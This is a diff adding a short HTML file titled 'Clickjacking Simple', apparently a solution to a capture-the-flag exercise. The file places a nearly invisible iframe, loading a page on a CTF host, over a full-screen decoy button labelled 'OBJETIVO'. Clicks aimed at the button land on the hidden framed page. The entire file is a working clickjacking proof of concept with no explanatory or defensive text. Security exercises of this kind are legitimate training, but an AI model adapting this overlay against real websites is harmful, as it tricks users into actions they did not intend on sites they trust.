@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Clickjacking Simple</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100vw; height: 100vh; overflow: hidden; }
+
+        
+        #objetivo {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            background: white;
+            border: none;
+        }
+
+     
+        iframe {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 999; 
+            opacity: 0.1; 
+            border: none;
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <button id="objetivo">OBJETIVO</button>
+
+    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+
+</body>
+</html>
